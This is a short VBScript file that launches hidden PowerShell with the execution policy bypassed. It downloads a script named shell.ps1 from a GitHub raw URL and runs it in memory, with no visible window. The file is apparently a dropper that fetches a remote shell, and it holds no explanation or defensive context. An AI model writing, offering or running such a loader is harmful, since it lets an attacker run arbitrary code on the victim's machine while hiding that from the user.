Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Jadmintor/testonly/refs/heads/main/shell.ps1')", 0, False
